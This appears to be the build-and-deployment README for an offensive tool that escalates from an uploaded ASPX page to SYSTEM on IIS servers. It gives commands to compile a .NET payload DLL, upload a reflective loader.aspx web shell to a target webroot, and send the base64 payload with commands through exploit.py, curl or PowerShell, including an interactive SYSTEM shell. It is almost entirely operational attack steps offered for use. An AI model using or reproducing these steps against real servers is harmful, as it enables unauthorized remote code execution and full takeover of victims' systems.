# IIS ASPX-to-SYSTEM -- Build & Setup

## Compiling the Payload DLL

The payload is a .NET class library compiled from `payload.cs`. It produces architecture-neutral MSIL that runs on both x64 and ARM64.

### Option 1: Mono (macOS / Linux)

```bash
mcs -target:library -out:payload.dll payload.cs
```

### Option 2: .NET Framework csc.exe (Windows)

```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library /out:payload.dll payload.cs
```

### Option 3: .NET SDK (any platform)

Create a minimal project file and build:

```bash
echo '<Project Sdk="Microsoft.NET.Sdk"><PropertyGroup><TargetFramework>net48</TargetFramework><OutputType>Library</OutputType></PropertyGroup></Project>' > payload.csproj
dotnet build -c Release
```

The output DLL will be in `bin/Release/net48/payload.dll`.

All three options produce identical MSIL. The resulting DLL is ~19KB.

## Deployment

### 1. Deploy the loader

Copy/upload `loader.aspx` to the IIS webroot on the target. This is the only file that touches disk. It contains no exploit code -- just `Assembly.Load` and reflection.

```bash
python3 exploit.py http://<target>/loader.aspx payload.dll "whoami /priv"
```

Interactive shell:

```bash
python3 exploit.py http://<target>/loader.aspx payload.dll
```

The first request sends the payload DLL and triggers the exploit. Subsequent commands in the interactive shell reuse the cached SYSTEM token without resending the payload.

```bash
B64=$(base64 -i payload.dll | tr -d '\n')
curl -X POST "http://<target>/loader.aspx" \
  --data-urlencode "d=$B64" \
  --data-urlencode "c=whoami"
```

On Windows (PowerShell):

```powershell
$b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes("payload.dll"))
$r = Invoke-WebRequest -Uri "http://<target>/loader.aspx" -Method POST -Body @{d=$b64; c="whoami"}
$r.Content
```